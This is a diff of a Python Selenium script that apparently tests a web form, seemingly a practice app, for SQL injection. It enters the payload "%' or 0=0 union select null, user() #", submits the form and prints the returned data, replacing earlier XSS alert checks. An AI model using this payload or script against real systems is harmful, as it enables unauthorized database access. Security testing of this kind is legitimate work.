@@ -131,17 +131,22 @@ link.click()
 link.send_keys("%' or 0=0 union select null, user() #")
 time.sleep(delay)
 
-
-
 driver.find_element_by_xpath('//*[@id="main_body"]/div/div/form/p/input[2]').click()
+
+# data = driver.find_element_by_xpath('/html/body/div[1]/div[3]/div/div/pre[1]')
+data = driver.find_elements_by_tag_name("pre")
+
+# print(data)
+
 try:
-    alert = driver.switch_to.alert
-    time.sleep(delay)
-    print(alert.text) 
-    alert.accept()
+    # alert = driver.switch_to.alert
+    # time.sleep(delay)
+    # print(alert.text) 
+    # alert.accept()
+    print(data)
 
 except:
-    print ("This page is safe from XSS.")
+    print ("This page is safe from SQl Injection attacks.")
 
 
 time.sleep(delay)
